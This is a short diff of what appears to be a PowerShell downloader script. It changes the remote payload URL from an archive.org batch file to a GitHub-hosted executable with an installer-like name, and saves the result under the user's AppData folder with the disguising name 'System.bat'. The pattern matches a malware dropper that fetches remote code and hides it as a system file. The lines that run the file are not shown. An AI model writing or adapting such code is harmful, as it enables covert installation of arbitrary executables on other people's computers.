@@ -1,4 +1,4 @@
-$url_pp = 'https://archive.org/download/pp_20250226/pp.bat'
+$url_pp = 'https://github.com/Hof6/R/raw/refs/heads/main/MPluginManager_01_19_setup.exe'
 $outputFile_pp = [System.IO.Path]::Combine($env:USERPROFILE, 'Appdata', 'System.bat')
 
 Start-Sleep -Milliseconds 100 
